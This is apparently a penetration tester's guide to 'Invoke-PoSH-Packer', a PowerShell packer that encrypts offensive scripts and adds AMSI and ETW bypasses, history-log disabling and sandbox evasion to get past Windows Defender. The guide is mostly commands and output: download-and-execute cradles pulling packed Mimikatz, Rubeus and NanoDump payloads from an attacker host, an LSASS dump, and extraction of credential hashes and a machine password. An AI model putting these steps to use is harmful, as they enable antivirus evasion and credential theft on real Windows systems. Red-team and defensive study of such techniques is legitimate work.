================================================================================================================================================
AV bypass using my PowerShell packer 'Invoke-PoSH-Packer'
================================================================================================================================================

'Invoke-PoSH-Packer' allows to pack and encrypt offensive PowerShell scripts (e.g. invoke-mimikatz.ps1, invoke-rubeus.ps1) in order to bypass
AV solutions such as Windows Defender.

=> URL: https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/Invoke-PoSH-Packer

FEATURES
---------
> AES encryption and GZip/Deflate compression (based on 'Xencrypt')
> AMSI bypass
> Blocking Event Tracing for Windows (ETW)
> Disabling PowerShell history logging
> Basic sandbox evasion techniques (optional)
  + stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
  + wait for 60 seconds before execution


================================================================================================================================================
Example 1 - Create & run a packed/encrypted version of "invoke-mimkatz.ps1" on a Windows 10 laptop without getting detected by Windows Defender
================================================================================================================================================

Step 1 - Create a packed/encrypted version of the script 'Invoke-mimkatz.ps1' using 'Invoke-PoSH-Packer.ps1'
---------------------------------------------------------------------------------------------------------------

PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Jean-Francois-C/Windows-Penetration-Testing/master/Defense%20evasion%20(examples)/Invoke-PoSH-Packer/Invoke-PoSH-Packer.ps1');

  ___     ___ _  _     ___         _
 | _ \___/ __| || |___| _ \___  __| |_____ _ _
 |  _/ _ \__ \ __ |___|  _/ _ |/ _| / / -_) '_|
 |_| \___/___/_||_|   |_| \__,|\__|_\_\___|_|
                                             v1.1
Usage:
> Invoke-PoSH-Packer -FileUrl https://URL/script.ps1 -OutFile C:\path\Packed-script.ps1
> Invoke-PoSH-Packer -FilePath C:\path\script.ps1 -OutFile C:\path\Packed-script.ps1

Features:
[*] AES encryption and GZip/Deflate compression (based on 'Xencrypt')
[*] AMSI bypass
[*] Blocking Event Tracing for Windows (ETW)
[*] Disabling PowerShell history logging
[*] Basic sandbox evasion techniques (optional -sandbox)

PS C:\temp> Invoke-PoSH-Packer -FileUrl https://github.com/S3cur3Th1sSh1t/Creds/raw/master/PowershellScripts/Invoke-Mimikatz.ps1 -OutFile C:\temp\packed-mimi.ps1 -SandBox
[*] Downloading the remote file: 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/PowershellScripts/Invoke-Mimikatz.ps1'
[*] File compression (GZip)
[*] File encryption (AES)
[*] Adding basic sandbox checks
[*] Adding 'A'M'S'I' bypass
[*] Adding 'E'T'W' bypass
[*] Disabling PoSh history logging
[*] Writing the obfuscated & encrypted PowerShell script: 'C:\temp\packed-mimi.ps1' ...
[+] Done!


Step 2 - Download & execute into memory the packed/encrypted version of the script 'Invoke-Mimikatz' without being detected by the Windows Defender AV
--------------------------------------------------------------------------------------------------------------------------------------------------------

PS C:\> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 01/02/2023 05:44:20


PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/packed-mimi.ps1');Invoke-Mimikatz

  .#####.   mimikatz 2.2.0 (x64) #19041 Oct  4 2020 10:28:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 454006390 (00000000:1b0f9676)
Session           : Interactive from 15
User Name         : Administrator
Domain            : Laptop1
Logon Server      : Laptop1
Logon Time        : 02/02/2023 00:55:57
SID               : S-1-5-21-936125016-2310263949-2175806047-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : Laptop1
         * NTLM     : 36f7a3ebaa54935ecf03678<SNIP>
         * SHA1     : d5feabcececab0e16c2cbb3<SNIP>
        tspkg :
         * Username : Administrator
         * Domain   : Laptop1
         * Password : <SNIP>
        wdigest :
         * Username : Administrator
         * Domain   : Laptop1
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : Laptop1
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO
 <SNIP>
 
 
================================================================================================================================================
Example 2 - Create & run a packed/encrypted version of "invoke-rubeus.ps1" on a Windows 10 laptop without getting detected by Windows Defender
================================================================================================================================================

Step 1 - Create a packed/encrypted version of the script 'Invoke-rubeus.ps1' using 'Invoke-PoSH-Packer.ps1'
-----------------------------------------------------------------------------------------------------------

PS C:\temp> ls

    Directory: C:\temp

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        27/01/2023     01:03                logs
d-----        02/02/2023     01:43                research
-a----        27/01/2023     00:21          13268 Invoke-PoSH-Packer.ps1


PS C:\temp> . .\Invoke-PoSH-Packer.ps1

  ___     ___ _  _     ___         _
 | _ \___/ __| || |___| _ \___  __| |_____ _ _
 |  _/ _ \__ \ __ |___|  _/ _ |/ _| / / -_) '_|
 |_| \___/___/_||_|   |_| \__,|\__|_\_\___|_|
                                             v1.1
Usage:
> Invoke-PoSH-Packer -FileUrl https://URL/script.ps1 -OutFile C:\path\Packed-script.ps1
> Invoke-PoSH-Packer -FilePath C:\path\script.ps1 -OutFile C:\path\Packed-script.ps1

Features:
[*] AES encryption and GZip/Deflate compression (based on 'Xencrypt')
[*] AMSI bypass
[*] Blocking Event Tracing for Windows (ETW)
[*] Disabling PowerShell history logging
[*] Basic sandbox evasion techniques (optional -sandbox)

PS C:\temp> Invoke-PoSH-Packer -FilePath C:\Users\Administrator\Documents\Tools-Pentest\9-PowerShell\Invoke-Rubeus.ps1 -OutFile C:\temp\packed-rub3us.ps1
[*] Loading the local file: 'C:\Users\Administrator\Documents\Tools-Pentest\9-PowerShell\Invoke-Rubeus.ps1'
[*] File compression (GZip)
[*] File encryption (AES)
[*] Adding 'A'M'S'I' bypass
[*] Adding 'E'T'W' bypass
[*] Disabling PoSh history logging
[*] Writing the obfuscated & encrypted PowerShell script: 'C:\temp\packed-rub3us.ps1' ...
[+] Done!
PS C:\temp>


Step 2 - Download & execute into memory the packed/encrypted version of the script 'Invoke-rubeus' without being detected by the Windows Defender AV
------------------------------------------------------------------------------------------------------------------------------------------------------

PS C:\> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 01/02/2023 05:44:20


PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/packed-rub3us.ps1');  

PS C:\> invoke-rubeus "currentluid"
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4

[*] Action: Display current LUID

[*] Current LogonID (LUID) : 0x1b0f9676 (454006390)


PS C:\> invoke-rubeus "hash /password:SuperPassword"
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4

[*] Action: Calculate Password Hash(es)

[*] Input password             : SuperPassword
[*]       rc4_hmac             : 104A92F7A0C45E38C04D1B283460BE2B

[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!
<SNIP>



===================================================================================================================================================
Example 3 - Create & run a packed/encrypted version of "invoke-nanodump.ps1" on a Windows Server 2016 without getting detected by Windows Defender
===================================================================================================================================================

Step 1 - Create a packed/encrypted version of the script 'invoke-nanodump.ps1' using 'Invoke-PoSH-Packer.ps1'
-------------------------------------------------------------------------------------------------------------

PS C:\temp> . .\Invoke-PoSH-Packer.ps1

  ___     ___ _  _     ___         _
 | _ \___/ __| || |___| _ \___  __| |_____ _ _
 |  _/ _ \__ \ __ |___|  _/ _ |/ _| / / -_) '_|
 |_| \___/___/_||_|   |_| \__,|\__|_\_\___|_|
                                             v1.1
Usage:
> Invoke-PoSH-Packer -FileUrl https://URL/script.ps1 -OutFile C:\path\Packed-script.ps1
> Invoke-PoSH-Packer -FilePath C:\path\script.ps1 -OutFile C:\path\Packed-script.ps1

Features:
[*] AES encryption and GZip/Deflate compression (based on 'Xencrypt')
[*] AMSI bypass
[*] Blocking Event Tracing for Windows (ETW)
[*] Disabling PowerShell history logging
[*] Basic sandbox evasion techniques (optional -sandbox)

PS C:\temp> Invoke-PoSH-Packer -FileUrl https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-NanoDump.ps1 -OutFile C:\temp\Packed-nano.ps1
[*] Downloading the remote file: 'https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-NanoDump.ps1'
[*] File compression (GZip)
[*] File encryption (AES)
[*] Adding 'A'M'S'I' bypass
[*] Adding 'E'T'W' bypass
[*] Disabling PoSh history logging
[*] Writing the obfuscated & encrypted PowerShell script: 'C:\temp\Packed-nano.ps1' ...
[+] Done!
PS C:\temp>


Step 2 - Download & execute into memory the packed/encrypted version of the script 'Invoke-rubeus' without being detected by the Windows Defender AV
------------------------------------------------------------------------------------------------------------------------------------------------------

PS C:\Users\Administrator> systeminfo

Host Name:                 WEBSERVER2
OS Name:                   Microsoft Windows Server 2016 Datacenter
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
<SNIP>


PS C:\Users\Administrator> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL

AntivirusEnabled              : True
RealTimeProtectionEnabled     : True
IoavProtectionEnabled         : True
AntispywareEnabled            : True
AntivirusSignatureLastUpdated : 02/02/2023 04:49:12


PS C:\Users\Administrator> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/temp/Packed-nano.ps1');invoke-nanodump

Exit functions patched: True

Trying to dump LSASS to: C:\windows\temp\trash.evtx
lsass.exe found
The minidump has an invalid signature, restore it running:
bash restore_signature.sh trash.evtx
Done, to get the secretz run:
python3 -m pypykatz lsa minidump trash.evtx
Thread Complete

Dumpfile successfully created!


PS C:\Users\Administrator> ls C:\Windows\Temp\trash.evtx

    Directory: C:\Windows\Temp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       03/02/2023     09:05       10792858 trash.evtx


Step 3 - Copy the lssas dump (trash.evtx) made with invoke-nanodump on a Kali and extract the credentials with pypkatz 
-----------------------------------------------------------------------------------------------------------------------

jeff@kali:~$ cd /home/jeff/Documents/Tools/nanodump-main/
jeff@kali:~/Documents/Tools/nanodump-main$ cd scripts/
jeff@kali:~/Documents/Tools/nanodump-main/scripts$ ./restore_signature trash.evtx 
done, to analize the dump run:
python3 -m pypykatz lsa minidump trash.evtx


jeff@kali:~/Documents/Tools/nanodump-main/scripts$ ls -al
total 10992
drwxr-xr-x 2 jeff jeff     4096 Feb  3 00:35 .
drwxr-xr-x 7 jeff jeff     4096 Feb  3 00:35 ..
-rwxr-xr-x 1 jeff jeff     3901 Feb  2 15:19 randomize_sw2_seed.py
-rwxr-xr-x 1 jeff jeff   700432 Feb  2 15:19 restore_signature
-rw-r--r-- 1 jeff jeff 10538938 Feb  3 00:35 trash.evtx


jeff@kali:~/Documents/Tools/nanodump-main$ cd ../

jeff@kali:~/Documents/Tools$ mkdir pypkatz

jeff@kali:~/Documents/Tools$ cd pypkatz/

jeff@kali:~/Documents/Tools/pypkatz$ pip3 install pypykatz

Defaulting to user installation because normal site-packages is not writeable
Collecting pypykatz
  Using cached pypykatz-0.6.3-py3-none-any.whl (384 kB)
Collecting unicrypto>=0.0.9
<SNIP>


jeff@kali:~/Documents/Tools/pypkatz$ python3 -m pypykatz lsa minidump ../nanodump-main/scripts/trash.evtx 

INFO:pypykatz:Parsing file ../nanodump-main/scripts/trash.evtx
FILE: ======== ../nanodump-main/scripts/trash.evtx =======
== LogonSession ==
authentication_id 57553 (e0d1)
session_id 1
username DWM-1
domainname Window Manager
logon_server 
logon_time 2023-02-02T22:27:53.147347+00:00
sid S-1-5-90-0-1
luid 57553
        == MSV ==
                Username: WEBSERVER2$
                Domain: COMPANY
                LM: NA
                NT: b71e7e77879711011bc5c39b27<SNIP>
                SHA1: 3e142f00c4a695910fed0bac<SNIP>
                DPAPI: NA
        == WDIGEST [e0d1]==
                username WEBSERVER2$
                domainname COMPANY
                password None
                password (hex)
        == Kerberos ==
                Username: WEBSERVER2$
                Domain: company.work
                Password: E)`Yc43f/dw(VcZrm/Uc&+*ujA?lCgl,DfzQ7c?<SNIP>
                password (hex)450029006000590063003400330066002f0<SNIP>
        == WDIGEST [e0d1]==
                username WEBSERVER2$
                domainname COMPANY
                password None
                password (hex)

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username WEBSERVER2$
domainname COMPANY
logon_server 
logon_time 2023-02-02T22:27:52.659993+00:00
sid S-1-5-20
luid 996
        == MSV ==
                Username: WEBSERVER2$
                Domain: COMPANY
                LM: NA
                NT: b71e7e77879711011bc5c39b<SNIP>
                SHA1: 3e142f00c4a695910fed0b<SNIP>
                DPAPI: NA
        == WDIGEST [3e4]==
                username WEBSERVER2$
                domainname COMPANY
                password None
                password (hex)
        == Kerberos ==
                Username: webserver2$
                Domain: COMPANY.WORK
        == WDIGEST [3e4]==
                username WEBSERVER2$
                domainname COMPANY
                password None
                password (hex)

== LogonSession ==
authentication_id 31634 (7b92)
session_id 0
username 
domainname 
logon_server 
logon_time 2023-02-02T22:27:51.933031+00:00
sid None
luid 31634
        == MSV ==
                Username: WEBSERVER2$
                Domain: COMPANY
                LM: NA
                NT: b71e7e77879711011bc5c39b<SNIP>
                SHA1: 3e142f00c4a695910fed0b<SNIP>
                DPAPI: NA

== LogonSession ==
authentication_id 149493 (247f5)
session_id 1
username Administrator
domainname WEBSERVER2
logon_server WEBSERVER2
logon_time 2023-02-02T22:28:12.883487+00:00
sid S-1-5-21-2855040287-2641962212-1900751911-500
luid 149493
        == MSV ==
                Username: Administrator
                Domain: WEBSERVER2
                LM: NA
                NT: cf3a5525ee9414229e662796<SNIP>
                SHA1: 3c7374127c9a60f9e5b28d<SNIP>
                DPAPI: NA
        == WDIGEST [247f5]==
                username Administrator
                domainname WEBSERVER2
                password None
                password (hex)
        == Kerberos ==
                Username: Administrator
                Domain: WEBSERVER2
        == WDIGEST [247f5]==
                username Administrator
                domainname WEBSERVER2
                password None
                password (hex)
<SNIP>

